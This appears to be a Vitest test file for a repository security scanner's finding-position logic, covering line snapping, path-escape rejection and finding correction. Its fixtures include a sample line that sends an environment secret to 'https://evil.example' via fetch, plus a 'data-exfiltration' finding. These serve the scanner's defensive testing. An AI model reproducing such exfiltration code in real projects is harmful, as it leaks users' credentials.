import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { describe, expect, it } from "vitest";
import type { Finding } from "@repo-auditor/scanner-core";
import { correctFindingPositions, readLinesWithin, snapFindingPosition } from "../src/position.js";

const lines = [
  "import fs from 'node:fs';",
  "const token = process.env.SECRET;",
  "fetch('https://evil.example', { body: token });",
  "// end",
  ""
];

describe("snapFindingPosition", () => {
  it("returns clamped line numbers when no snippet is provided", () => {
    expect(snapFindingPosition(lines, 0, 99)).toEqual({ lineStart: 1, lineEnd: 4 });
  });

  it("snaps the range onto the snippet's first line when found near the report", () => {
    const result = snapFindingPosition(lines, 3, 3, "fetch('https://evil.example'");
    expect(result.lineStart).toBe(3);
    expect(result.lineEnd).toBe(3);
  });

  it("returns an empty array file range unchanged (clamped) when snippet is absent", () => {
    const result = snapFindingPosition([], 5, 10, "anything");
    expect(result.lineStart).toBe(1);
    expect(result.lineEnd).toBe(1);
  });

  it("clamps out-of-range values to file bounds", () => {
    expect(snapFindingPosition(lines, -5, -1)).toEqual({ lineStart: 1, lineEnd: 1 });
  });
});

describe("readLinesWithin", () => {
  it("rejects paths that escape the root", async () => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "pos-safe-"));
    await expect(readLinesWithin(root, "../evil.txt")).rejects.toThrow(/escape/i);
  });

  it("reads a file as line array (no spurious trailing empty entry)", async () => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "pos-read-"));
    await fs.writeFile(path.join(root, "a.js"), "line one\nline two\n");
    await expect(readLinesWithin(root, "a.js")).resolves.toEqual(["line one", "line two"]);
  });
});

describe("correctFindingPositions", () => {
  it("snaps finding ranges against the real file content", async () => {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "pos-correct-"));
    await fs.writeFile(path.join(root, "target.js"), "const a = 1;\nconst token = 'x';\nsend(token);\n");

    const finding: Finding = {
      id: "",
      riskLevel: "Medium",
      category: "data-exfiltration",
      filePath: "target.js",
      lineStart: 1,
      lineEnd: 1,
      codeSnippet: "send(token);",
      explanation: "exfil",
      recommendedFix: "stop",
      evidenceTags: [],
      source: "ai",
      confidence: "Low"
    };

    const [corrected] = await correctFindingPositions([finding], root);
    expect(corrected.lineStart).toBe(3);
    expect(corrected.lineEnd).toBe(3);
  });

  it("leaves findings unchanged when scanPath is empty", async () => {
    const finding: Finding = {
      id: "x",
      riskLevel: "Low",
      category: "data-exfiltration",
      filePath: "nope.js",
      lineStart: 4,
      lineEnd: 6,
      codeSnippet: "b",
      explanation: "e",
      recommendedFix: "f",
      evidenceTags: [],
      source: "ai",
      confidence: "Low"
    };
    const out = await correctFindingPositions([finding], "");
    expect(out).toEqual([finding]);
  });
});
